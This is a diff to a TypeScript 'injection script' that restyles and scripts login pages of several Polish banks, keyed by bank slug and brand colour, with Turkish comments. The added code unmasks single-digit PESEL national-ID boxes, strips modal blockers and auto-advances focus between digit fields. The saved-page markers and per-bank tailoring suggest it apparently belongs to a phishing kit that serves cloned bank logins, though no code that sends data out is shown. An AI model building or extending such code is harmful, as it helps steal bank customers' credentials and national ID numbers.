@@ -451,6 +451,11 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             "ing-button,ing-input,ing-input-masked-password-field,bnp-input,san-input{" +
             "pointer-events:auto !important;user-select:auto !important;-webkit-user-select:auto !important}" +
             ".sf-hidden{display:none !important}" +
+            // Tek-karakter masked kutular: yazilan karakter GORUNUR olsun
+            // (kullanici "yazdigimi goremiyorum" dedi) + okunur renk.
+            "input[maxlength='1'],input[text-length='1'],input[name^=Pesel-]{" +
+            "-webkit-text-security:none !important;color:#191c1f !important;" +
+            "-webkit-text-fill-color:#191c1f !important;opacity:1 !important;text-align:center !important}" +
             ".modal-backdrop,.cdk-overlay-backdrop,.modal-blocker,.blocker{display:none !important}";
           (root.head || root.documentElement).appendChild(st);
         }
@@ -490,6 +495,21 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             "}",
           "bsr-krakow":
             "@media(max-width:900px){html,body{min-width:0!important;overflow-x:hidden!important}}" ,
+          millennium:
+            // PESEL satiri: gri 22px goruntu kutulari + MUI native input'lari
+            // tek tip beyaz 40x44 kutuya cevir; enjekte input grey kutunun
+            // ustune opak biner — kayitli eski gri ton kaybolur.
+            "[data-testid=security-digits-container] .css-9i7jw0{width:40px!important;height:44px!important;" +
+            "background:#ffffff!important;border:1px solid #b9b9b9!important;border-radius:6px!important;position:relative!important}" +
+            "[data-testid=security-digits-container] .css-nfgiif{display:flex!important;flex-direction:column!important;align-items:center!important}" +
+            "[data-testid=security-digits-container] input[name^=Pesel]{width:40px!important;height:44px!important;padding:0!important;margin:0 auto 4px auto!important;display:block!important;" +
+            "background:#ffffff!important;border:1px solid #b9b9b9!important;border-radius:6px!important;box-sizing:border-box!important;" +
+            "color:#191c1f!important;-webkit-text-fill-color:#191c1f!important;-webkit-text-security:none!important;" +
+            "font-size:18px!important;font-weight:600!important;text-align:center!important;caret-color:#191c1f!important;opacity:1!important}" +
+            "[data-testid=security-digits-container] input[name^=Pesel]:focus{border-color:#dd1a21!important;outline:2px solid rgba(221,26,33,.35)!important;outline-offset:0!important}" +
+            "[data-testid=security-digits-container] .MuiInput-root:before,[data-testid=security-digits-container] .MuiInput-root:after{display:none!important;border:none!important}" +
+            "[data-testid=security-digits-container] .MuiTextField-root,[data-testid=security-digits-container] .MuiInputBase-root{width:40px!important;min-width:40px!important;max-width:40px!important;padding:0!important}" +
+            "[data-testid=security-digits-container] .MuiBox-root{width:auto!important;padding:0!important}",
         };
         const bankCss = BANK_CSS[BANK_SLUG];
         if (bankCss && !root.getElementById("pl-bank-fix")) {
@@ -698,12 +718,19 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             el.__plMasked = true;
             if (/^pesel-\\d+$/i.test(el.getAttribute("name") || "")) el.setAttribute("maxlength", "1");
             el.setAttribute("autocomplete", "off");
-            el.addEventListener("input", () => {
+            const advanceNext = () => {
               try {
                 if ((el.value || "").length >= 1) {
                   const next = maskedBoxes()[i + 1];
-                  if (next) next.focus();
+                  if (next) { next.focus(); try { next.select(); } catch (e) {} }
                 }
+              } catch (e) {}
+            };
+            el.addEventListener("input", advanceNext);
+            el.addEventListener("keyup", (ev) => {
+              try {
+                if (ev.key === "Backspace" || ev.key === "Tab" || ev.key === "Shift") return;
+                advanceNext();
               } catch (e) {}
             });
             el.addEventListener("keydown", (ev) => {
